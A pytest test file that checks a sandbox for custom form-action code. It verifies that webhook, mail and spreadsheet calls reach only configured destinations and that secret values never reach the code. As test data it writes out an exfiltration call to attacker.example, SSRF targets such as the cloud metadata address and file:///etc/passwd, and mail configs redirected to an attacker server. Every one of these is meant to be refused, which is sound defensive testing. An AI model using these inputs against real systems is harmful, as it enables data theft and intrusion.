"""The calls custom action code may make (utilities/custom_action.py): the code
runs in the real sandbox child; the calls land in recording fakes. What matters:
a call only goes where this run is configured to send, a secret is a name in the
child and a value only in the executor, and nothing the code is not entitled to
comes out."""

import asyncio

import pytest

from sandbox import broker
from utilities import custom_action, egress
from utilities.custom_action import (
    Toolbox,
    build_handlers,
    resolve_secrets,
    without_secrets,
)
from sandbox.broker import CallRefused
from tests.sandbox_support import needs_confinement

SECRET = "SECRET-VALUE-OF-THIS-RUN-987654"
HOOK = "https://hooks.acme.example/in/abc"


class Fakes:
    def __init__(self):
        self.calls = []

    def recorder(self, name, result=None):
        def call(*args, **kwargs):
            self.calls.append((name, args, kwargs))
            return result

        return call


def toolbox(fakes=None, **overrides):
    fakes = fakes or Fakes()
    parameters = {
        "Webhook URL": HOOK,
        "Google Sheet Id": "sheet-123",
        "server": "smtp.acme.example",
        "Port": "587",
        "Username": "acme-user",
        "Sender": "forms@acme.example",
    }
    secrets = {"Token": SECRET, "Password": "smtp-pw", "Credentials": '{"token": "t"}'}
    box = Toolbox(
        parameters=parameters,
        secrets=secrets,
        trusted_hosts=[],
        smtp_trusted=False,
        respondent_email="responder@example.org",
        webhook=fakes.recorder(
            "webhook", type("R", (), {"status_code": 200, "text": "fine"})()
        ),
        discord=fakes.recorder(
            "discord", type("R", (), {"status_code": 204, "text": ""})()
        ),
        slack=fakes.recorder(
            "slack", type("R", (), {"status_code": 200, "text": "ok"})()
        ),
        config_mail=lambda *args: ("config", args),
        send_mail=fakes.recorder("send_mail", "ok"),
        append_sheet=fakes.recorder("sheet", "Appended"),
        approved_recipient=lambda address: (
            address.casefold()
            if address == "owner@acme.example"
            else (_ for _ in ()).throw(PermissionError())
        ),
    )
    for key, value in overrides.items():
        setattr(box, key, value)
    box.fakes = fakes
    return box


def run(code, box, **limits):
    data = {"response": {"a": 1}, "form": {"form_id": "f"}, "workspace": {"id": "w"}}

    async def go():
        return await custom_action.run_custom_code(code, data=data, toolbox=box)

    return asyncio.run(go())


pytestmark = needs_confinement


def test_a_webhook_to_a_configured_address_goes_out_with_the_secret_opened_here():
    box = toolbox()
    outcome = run(
        "r = send_data_webhook(get_parameter('Webhook URL'), data={'n': 1}, "
        "headers={'Authorization': get_secret('Token')})\n"
        "log(str(r.status_code) + ' ' + r.text)",
        box,
    )
    assert outcome.error is None, outcome.error
    assert outcome.log == ["200 fine"]
    name, args, _ = box.fakes.calls[0]
    assert name == "webhook"
    assert args[0] == HOOK
    assert args[2] == {"n": 1}
    assert args[3] == {"Authorization": SECRET}  # opened here, not in the child
    assert SECRET not in repr(outcome)


def test_an_address_the_run_is_not_configured_with_is_refused():
    box = toolbox()
    outcome = run(
        "send_data_webhook('https://attacker.example/steal', data=get_response())\n",
        box,
    )
    assert outcome.error["kind"] == "http"
    assert "not one this action is configured with" in outcome.error["message"]
    assert box.fakes.calls == []


@pytest.mark.parametrize(
    "url",
    [
        "http://hooks.acme.example/in/abc",  # configured host, not https
        "https://hooks.acme.example:8443/in",  # another port
        "https://127.0.0.1/",
        "https://169.254.169.254/latest/meta-data/",
        "https://user:pw@hooks.acme.example/",
        "file:///etc/passwd",
        "https://hooks.acme.example.attacker.example/",
    ],
)
def test_other_spellings_of_destinations_are_refused(url):
    box = toolbox()
    outcome = run(f"send_data_webhook({url!r}, data={{}})\n", box)
    assert outcome.error["kind"] == "http"
    assert box.fakes.calls == []


def test_a_configured_name_that_resolves_inward_is_refused_by_the_egress_rules():
    def refuse(url, params, data, headers):
        raise egress.EgressRefused("not_allowed")

    box = toolbox(webhook=refuse)
    outcome = run("send_data_webhook(get_parameter('Webhook URL'), data={})", box)
    assert outcome.error["kind"] == "http"
    assert "not_allowed" in outcome.error["message"]


def test_the_code_can_catch_a_refusal_and_goes_on():
    outcome = run(
        "try:\n    send_data_webhook('https://attacker.example/', data={})\n"
        "except HTTPException as e:\n    log('refused ' + str(e.status_code))\nlog('done')",
        toolbox(),
    )
    assert outcome.error is None
    assert outcome.log == ["refused 403", "done"]


def test_an_unknown_secret_and_a_secret_in_the_address_are_refused():
    box = toolbox()
    outcome = run(
        "send_data_webhook(get_parameter('Webhook URL'), headers={'X': {'$secret': 'Nope'}})",
        box,
    )
    assert outcome.error["kind"] == "http" and "secret" in outcome.error["message"]
    outcome = run("send_data_webhook(get_secret('Token'), data={})", box)
    assert outcome.error["kind"] == "http"
    assert box.fakes.calls == []


def test_the_data_sent_to_the_code_holds_no_secret_value():
    box = toolbox()
    outcome = run(
        "log(str(get_secrets()))\nlog(str(get_parameters()))\n"
        "log(str(workspace)); log(str(form)); log(str(action))",
        box,
    )
    assert SECRET not in repr(outcome)
    assert "smtp-pw" not in repr(outcome)
    assert (
        outcome.log[0]
        == "{'Credentials': <secret Credentials>, 'Password': <secret Password>, 'Token': <secret Token>}"
    )


def test_without_secrets_strips_every_depth():
    cleaned = without_secrets(
        {
            "secrets": {"a": [{"value": "x"}]},
            "keep": [{"secrets": 1, "n": 2}],
            "action_code": "c",
        }
    )
    assert cleaned == {"keep": [{"n": 2}]}


def test_resolve_secrets():
    assert resolve_secrets({"h": [{"$secret": "A"}], "n": 1}, {"A": "v"}) == {
        "h": ["v"],
        "n": 1,
    }
    with pytest.raises(CallRefused):
        resolve_secrets({"$secret": "B"}, {"A": "v"})
    with pytest.raises(CallRefused):
        resolve_secrets({"$secret": 5}, {"A": "v"})


MAIL = (
    "c = config_mail(get_parameter('Username'), get_secret('Password'), "
    "get_parameter('Sender'), get_parameter('Port'), get_parameter('server'))\n"
)


def test_a_mail_uses_the_configured_login_and_goes_to_the_respondent_or_a_member():
    box = toolbox()
    outcome = run(
        MAIL
        + "send_mail_action(c, 'Thanks', ['responder@example.org', 'owner@acme.example'])",
        box,
    )
    assert outcome.error is None, outcome.error
    name, args, _ = box.fakes.calls[0]
    assert name == "send_mail"
    assert args[1] == "Thanks"
    assert args[2] == ["responder@example.org", "owner@acme.example"]
    assert args[0][0] == "config"
    assert args[0][1][1] == "smtp-pw"  # the password opened here
    assert "smtp-pw" not in repr(outcome)


@pytest.mark.parametrize(
    "tail",
    [
        "send_mail_action(c, 'x', ['stranger@elsewhere.example'])",  # not a member
        "send_mail_action(c, 'x', ['owner@acme.example'] * 6)",  # too many
        "send_mail_action(c, 'x', [])",
        "send_mail_action(c, 'x' * 1000, ['owner@acme.example'])",
        "send_mail_action(dict(c, smtp_server='attacker.example'), 'x', ['owner@acme.example'])",
        "send_mail_action(dict(c, smtp_username='root'), 'x', ['owner@acme.example'])",
        "send_mail_action(dict(c, smtp_password='guess'), 'x', ['owner@acme.example'])",
        "send_mail_action(dict(c, extra=1), 'x', ['owner@acme.example'])",
        "send_mail_action('not a config', 'x', ['owner@acme.example'])",
    ],
)
def test_a_mail_that_is_not_the_configured_one_is_refused(tail):
    box = toolbox()
    outcome = run(MAIL + tail, box)
    assert outcome.error["kind"] == "http", outcome
    assert box.fakes.calls == []


def test_a_mail_server_a_workspace_named_must_be_public(monkeypatch):
    monkeypatch.setattr(egress, "resolve", lambda host, port: ["10.0.0.5"])
    box = toolbox()
    outcome = run(MAIL + "send_mail_action(c, 'x', ['owner@acme.example'])", box)
    assert outcome.error["kind"] == "http" and "not_allowed" in outcome.error["message"]
    # the instance's own server is its administrators' choice
    box = toolbox(smtp_trusted=True)
    outcome = run(MAIL + "send_mail_action(c, 'x', ['owner@acme.example'])", box)
    assert outcome.error is None


def test_a_sheet_row_goes_to_a_configured_sheet_with_the_runs_own_credential():
    box = toolbox()
    outcome = run(
        "log(append_in_sheet(get_parameter('Google Sheet Id'), get_secret('Credentials'), "
        "[{'title': 'Q', 'answer': 'A'}, {'title': 'N', 'answer': None}]))",
        box,
    )
    assert outcome.error is None, outcome.error
    assert outcome.log == ["Appended"]
    _, args, _ = box.fakes.calls[0]
    assert args == (
        "sheet-123",
        '{"token": "t"}',
        [{"title": "Q", "answer": "A"}, {"title": "N", "answer": ""}],
    )


@pytest.mark.parametrize(
    "call",
    [
        "append_in_sheet('some-other-sheet', get_secret('Credentials'), [])",
        "append_in_sheet(get_parameter('Google Sheet Id'), 'my own credentials', [])",
        "append_in_sheet(get_parameter('Google Sheet Id'), get_secret('Credentials'), 'rows')",
        "append_in_sheet(get_parameter('Google Sheet Id'), get_secret('Credentials'), [{'title': 1}])",
        "append_in_sheet(get_parameter('Google Sheet Id'), get_secret('Credentials'), [{'title': 'a', 'answer': 'b'}] * 501)",
    ],
)
def test_a_sheet_call_that_is_not_the_runs_own_is_refused(call):
    box = toolbox()
    outcome = run(call, box)
    assert outcome.error["kind"] == "http", outcome
    assert box.fakes.calls == []


def test_a_sheet_that_is_gone_reaches_the_code_as_the_same_exception():
    from models.exception_enum import ExceptionType
    from utilities.exceptions import HTTPException

    def gone(*args):
        raise HTTPException(status_code=404, content=ExceptionType.GOOGLE_SHEET_MISSING)

    box = toolbox(append_sheet=gone)
    outcome = run(
        "append_in_sheet(get_parameter('Google Sheet Id'), get_secret('Credentials'), [])",
        box,
    )
    assert outcome.error["kind"] == "http"
    assert outcome.error["message"] == ExceptionType.GOOGLE_SHEET_MISSING


def test_the_number_of_calls_is_limited(monkeypatch):
    monkeypatch.setattr(custom_action.settings, "action_sandbox_max_calls", 3)
    box = toolbox()
    outcome = run(
        "for i in range(10):\n    send_data_webhook(get_parameter('Webhook URL'), data={})",
        box,
    )
    assert outcome.error["kind"] == "quota"
    assert len(box.fakes.calls) == 3


def test_the_code_cannot_call_what_is_not_in_the_table():
    # a child that is made to send an arbitrary call name (the policy layer off)
    async def go():
        return await broker.run_code(
            "_call('fetch_oauth_token', credentials='x')\n"
            "_call('build_google_service')\n"
            "_call('crypto')\n",
            {},
            build_handlers(toolbox()),
            _unvalidated_for_tests=True,
        )

    outcome = asyncio.run(go())
    assert outcome.error["kind"] == "http"
    assert outcome.error["message"] == "unknown call"


def test_a_call_with_the_wrong_arguments_is_refused_not_crashed():
    async def go():
        return await broker.run_code(
            "_call('send_data_webhook', nonsense=1)\n",
            {},
            build_handlers(toolbox()),
            _unvalidated_for_tests=True,
        )

    outcome = asyncio.run(go())
    assert (
        outcome.error["kind"] == "http" and outcome.error["message"] == "bad arguments"
    )
